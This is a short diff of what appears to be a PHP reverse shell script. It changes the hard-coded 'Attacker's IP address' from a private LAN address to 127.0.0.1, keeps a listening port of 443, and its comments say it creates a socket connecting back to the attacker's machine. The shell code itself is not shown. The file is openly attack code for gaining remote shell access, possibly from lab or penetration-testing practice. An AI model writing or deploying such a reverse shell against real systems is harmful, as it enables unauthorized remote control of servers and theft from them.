@@ -1,6 +1,6 @@
 <?php
 // Change the IP and port to match your setup
-$ip = '192.168.150.130';  // Attacker's IP address
+$ip = '127.0.0.1';  // Attacker's IP address
 $port = 443;     // Attacker's listening port
 
 // Create a socket and connect to the attacker's machine
